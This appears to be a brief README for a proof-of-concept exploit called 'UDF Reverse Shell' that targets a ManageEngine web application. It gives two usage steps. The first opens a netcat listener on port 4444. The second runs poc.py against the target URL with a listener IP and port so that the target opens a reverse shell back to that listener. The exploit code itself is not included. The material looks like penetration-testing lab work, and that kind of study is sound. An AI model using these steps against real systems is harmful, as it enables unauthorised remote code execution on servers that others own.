# UDF Reverse Shell

## How to use
1. Start a netcat listener:
```bash
nc -lnvp 4444
```

2. Run the proof of concept (poc.py) using Python2 and specify the target ManageEngine web application and listener parameters:
```bash
python2 poc.py https://manageengine:8443 192.168.45.211 4444
```
